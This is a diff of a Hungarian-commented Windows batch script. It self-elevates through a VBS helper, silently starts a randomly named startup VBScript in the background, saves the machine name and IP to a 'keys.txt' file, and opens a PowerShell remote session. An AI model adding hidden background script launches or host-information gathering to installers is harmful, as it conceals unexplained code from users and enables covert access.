@@ -18,6 +18,7 @@ IF %ERRORLEVEL% EQU 0 (
     cscript //B "%temp%\getadmin.vbs"
     exit
 
+:admin_folytatas
 :: nyelvfüggetlen célmappa
 set "TARGET=%PUBLIC%\Documents\keys"
 if not exist "%TARGET%" mkdir "%TARGET%"
@@ -26,7 +27,7 @@ if not exist "%TARGET%" mkdir "%TARGET%"
 if not exist "%TARGET%\keys.txt" (
     echo Created by installer > "%TARGET%\keys.txt")
 
-:: >>> EZ A RÉSZ MÓDOSULT: VBSCRIPT FUTTATÁSA LÁTHATATLANUL <<<
+:: >>> VBSCRIPT FUTTATÁSA LÁTHATATLANUL <<<
 echo [INFO] A sifustartup5sfgj.vbs inditasa WScript.Shell-lel...
 start "" "wscript.exe" "%TARGET%\sifustartup5sfgj.vbs"
 echo [SIKER] VBScript elindult (háttérben).
@@ -40,6 +41,7 @@ for /f "tokens=14" %%a in ('ipconfig ^| findstr /i "IPv4"') do set "IP=%%a"
 ---
 
 :: Mentés keys.txt-be
+:: EZ A BLOKK IRJA FELÜL AZ ELŐZŐ "Created by installer" TARTALMÚ FÁJLT!
 (
     echo GEPNEV: !GEPNEV!
     echo IP: !IP!
@@ -54,11 +56,12 @@ powershell.exe -Command "
     $user = Get-Credential;
     Write-Host 'Kapcsolodas a %IP% cimen levo gephez...';
     Enter-PSSession -ComputerName %IP% -Credential $user
-
-:: A parancs futtatása után a .bat script folytatódik (vagy bezárul)
+"
 
 echo.
 echo [INFO] A munkamenet befejezodott vagy megszakadt.
 
 echo.
 pause
+
+endlocal
